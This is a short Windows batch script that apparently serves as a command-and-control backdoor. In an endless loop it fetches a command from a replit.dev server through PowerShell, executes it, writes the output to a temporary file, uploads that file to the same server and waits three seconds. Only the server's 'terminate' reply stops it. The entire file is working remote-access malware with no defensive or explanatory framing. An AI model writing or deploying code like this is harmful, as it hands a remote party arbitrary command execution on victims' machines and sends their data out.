
@echo off
setlocal enabledelayedexpansion

set "baseUrl=https://200c7462-2195-45ad-96c6-ead94ec77dcc-00-yf8wy96qozl1.kirk.replit.dev/"

:main
echo Retrieving command from server...
for /f "delims=" %%I in ('powershell -Command "(New-Object System.Net.WebClient).DownloadString('%baseUrl%')"') do (
    set "command=%%I"
)

if "%command%"=="terminate" (
    echo Terminating...
    goto :eof
)

echo Executing command: %command%
(for /f "delims=" %%O in ('%command% 2^>^&1') do (
    set "output=%%O"
    set "output=!output:"=^"!"
    echo !output!
)) > temp.txt

echo Sending output to server...
powershell -Command "(New-Object System.Net.WebClient).UploadFile('%baseUrl%', 'temp.txt')"

del temp.txt

timeout /t 3 /nobreak >nul
goto main
